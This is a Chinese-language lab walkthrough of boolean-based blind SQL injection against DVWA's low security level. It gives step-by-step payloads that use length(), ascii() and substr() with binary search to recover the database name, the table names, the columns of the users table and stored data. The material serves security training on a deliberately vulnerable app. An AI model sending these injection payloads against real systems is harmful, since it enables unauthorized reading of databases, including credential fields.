# SQL Injection (Blind)

> ## @Date：2021-4-29
>
> ## @Last：2021-4-30
>
> ## @Author：Tanyiqu

## low

首先介绍MySQL数据库的几个函数

```
length(str);			获取字符串的长度
ascii(str);				返回str最左面字符的ASCII码值
substr(str,pos);		截取字符串，从pos位置截取到字符串末尾
substr(str,pos,len);	截取字符串，从pos位置开始截取len个字符
```



### 验证是否存在SQL注入

首先输入 `1` ，提示用户存在

首先输入 `10` ，提示用户存在

再输入 `1'` ，提示用户不存在

再输入 `1' and 1=1#`  ，提示用户存在

再输入 `10' and 1=1#`  ，提示用户不存在

可以判断输入存在SQL注入

同时我们可以看出：页面只有两种反馈，用户存在和用户不存在



### 尝试猜测数据库名称

#### 首先猜测数据库长度

##### 原理

```
使用 length(database()) 计算数据库的长度
再依次判断该值
如果提示用户存在，则猜测正确，否则猜测错误
```



##### 尝试

依次尝试下面语句

```
1' and length(database())=1 # 提示不存在
1' and length(database())=2 # 提示不存在
1' and length(database())=3 # 提示不存在
1' and length(database())=4 # 提示存在
```

可以得到数据库的长度为4



#### 尝试猜解数据库名

从数据库名的第一位字符开始，依次猜解每一位的字符，猜解使用二分法

##### 原理

```
先用 substr(database(),1,1) 截取数据库的第一位字符
再用 ascii() 将第一位字符转成ASCII值
再判断 该值是否大于字符a(97)的ASCII值
如果提示用户存在，则大于a，否则不大于a
```



##### 尝试

```
1' and ascii(substr(database(),1,1))>97 # 提示用户存在，说明数据库名第一位字符的ASCII值大于97(a)
1' and ascii(substr(database(),1,1))<122 # 提示用户存在，说明数据库名第一位字符的ASCII值小于122(z)
1' and ascii(substr(database(),1,1))<109 # 提示用户存在，说明数据库名第一位字符的ASCII值小于109(m)
....
1' and ascii(substr(database(),1,1))>99 # 提示用户存在，说明数据库名第一位字符的ASCII值大于99(c)
1' and ascii(substr(database(),1,1))<100 # 提示用户不存在，说明数据库名第一位字符的ASCII值不小于100(d)
最后两个条件可以得出，第一位大于c，但不小于d，所以第一位为d

继续验证后面三位
1' and ascii(substr(database(),2,1))>97 # 提示用户存在，说明数据库名第二位字符的ASCII值大于97(a)
...
```

得出数据库名为：dvwa



### 猜解数据库的表

#### 猜解数据库的表的数量

##### 原理

```
在MySQL中，使用下面语句可以查出对应数据库有多少张表
select count(table_name) from information_schema.tables where table_schema='dvwa'

再依次判断该值
如果提示用户存在，则猜测正确，否则猜测错误
```



##### 尝试

```
1' and (select count(table_name) from information_schema.tables where table_schema='dvwa')=1 # 提示不存在

1' and (select count(table_name) from information_schema.tables where table_schema='dvwa')=2 # 提示存在
```

说明数据库中有两张表



#### 依次猜解表的长度

##### 原理

```
下面语句可以查出数据库中 第一张表的名字
select table_name from information_schema.tables where table_schema='dvwa' limit 0,1

再取长度，依次判断
```



##### 尝试

```
1' and length((select table_name from information_schema.tables where table_schema='dvwa' limit 0,1))=1 # 提示不存在
1' and length((select table_name from information_schema.tables where table_schema='dvwa' limit 0,1))=2 # 提示不存在
...
1' and length((select table_name from information_schema.tables where table_schema='dvwa' limit 0,1))=9 # 提示存在
```

说明第一张表的长度为9

同理

```
1' and length((select table_name from information_schema.tables where table_schema='dvwa' limit 1,1))=1 # 提示不存在
1' and length((select table_name from information_schema.tables where table_schema='dvwa' limit 1,1))=2 # 提示不存在
...
1' and length((select table_name from information_schema.tables where table_schema='dvwa' limit 1,1))=5 # 提示存在
```

说明第二张表的长度为5



#### 猜解表名

##### 原理

```
先查出第一张表的名字，暂定为tname
select table_name from information_schema.tables where table_schema='dvwa' limit 0,1

再截取第一个字符，暂定为char
substr(tname,1,1)

在计算它的ASCII值
ascii(char)

最后使用二分法猜测具体指
```



##### 尝试

```
# 第一张表
# 第一张表的第一位
1' and ascii(substr((select table_name from information_schema.tables where table_schema='dvwa' limit 0,1),1,1))>102 # 提示存在 （大于f）

1' and ascii(substr((select table_name from information_schema.tables where table_schema='dvwa' limit 0,1),1,1))<103 # 提示不存在 （不小于g）
# 第一张表的第一位为g

# 第一张表的第二位
1' and ascii(substr((select table_name from information_schema.tables where table_schema='dvwa' limit 0,1),2,1))>116 # 提示存在 （大于t）

1' and ascii(substr((select table_name from information_schema.tables where table_schema='dvwa' limit 0,1),2,1))<117 # 提示不存在 （不小于u）
# 第一张表的第二位为u
...
# 得到第一张表的表名为 guestbook

# 第二张表
# 第二张表的第一位
1' and ascii(substr((select table_name from information_schema.tables where table_schema='dvwa' limit 1,1),1,1))>116 # 提示存在 （大于t）

1' and ascii(substr((select table_name from information_schema.tables where table_schema='dvwa' limit 1,1),1,1))<117 # 提示不存在 （不小于u）
# 第二张表的第一位为u

# 第二张表的第二位
1' and ascii(substr((select table_name from information_schema.tables where table_schema='dvwa' limit 1,1),2,1))>114 # 提示存在 （大于r）

1' and ascii(substr((select table_name from information_schema.tables where table_schema='dvwa' limit 1,1),2,1))<115 # 提示不存在 （不小于s）
# 第二张表的第二位为s
...
# 得到第二张表的表名为 users
```



#### 猜解表的字段数量

##### 原理

```
先查出users表中的字段数量
select count(column_name) from information_schema.columns where table_name= 'users'

再依次猜解
```



##### 尝试

猜user表中的字段数量

```
1' and (select count(column_name) from information_schema.columns where table_name= 'users')=1 # 显示不存在

1' and (select count(column_name) from information_schema.columns where table_name= 'users')=8 # 显示存在
# user表中的字段为8
```



#### 猜解user表的字段

猜解第1个字段的长度

```
1' and length(substr((select column_name from information_schema.columns where table_name= 'users' limit 0,1),1))=1 # 显示不存在
...
1' and length(substr((select column_name from information_schema.columns where table_name= 'users' limit 0,1),1))=7 # 显示存在
# user表的第一个字段长度为7
```

猜解第2个字段的长度

```
1' and length(substr((select column_name from information_schema.columns where table_name= 'users' limit 1,1),1))=1 # 显示不存在
...
1' and length(substr((select column_name from information_schema.columns where table_name= 'users' limit 1,1),1))=10 # 显示存在
# user表的第二个字段长度为10
```



依次猜解user表第一个字段

```同理，得到
# 继续使用二分法猜解字段名
1' and ascii(substr((select column_name from information_schema.columns where table_name='users' limit 0,1),1,1))=117 # 显示存在
# user表第一个字段的第1位为u

1' and ascii(substr((select column_name from information_schema.columns where table_name='users' limit 0,1),2,1))=115 # 显示存在
# user表第一个字段的第2位为s

1' and ascii(substr((select column_name from information_schema.columns where table_name='users' limit 0,1),3,1))=101 # 显示存在
# user表第一个字段的第3位为e

1' and ascii(substr((select column_name from information_schema.columns where table_name='users' limit 0,1),4,1))=114 # 显示存在
# user表第一个字段的第4位为r

1' and ascii(substr((select column_name from information_schema.columns where table_name='users' limit 0,1),5,1))=95 # 显示存在
# user表第一个字段的第5位为_

1' and ascii(substr((select column_name from information_schema.columns where table_name='users' limit 0,1),6,1))=105 # 显示存在
# user表第一个字段的第6位为i

1' and ascii(substr((select column_name from information_schema.columns where table_name='users' limit 0,1),7,1))=100 # 显示存在
# user表第一个字段的第7位为d

# user表第一个字段为 user_id

同理，得到user表中所有字段
user
avatar
failed_login
first_name
last_login
last_name
password
user_id
```



### 猜解数据

同样采用二分法

猜解user_id字段的第一条数据，这里特意使用类型为int的字段，原理都一样，转换成字符串二分法就可以

```
# 先猜数据长度，猜出长度为1
1' and (select length(substr((select user_id from dvwa.users limit 0,1),1)))=1 # 显示存在

# 再逐个猜每一位
1' and (select (substr((select user_id from dvwa.users limit 0,1),1,1)))=1 # 显示存在

# 猜出user_id字段的第一条数据为 1
```



至此，low等级毕！

<br>

## medium

需要配合BP抓包

<br>

## high

需要配合BP抓包

<br>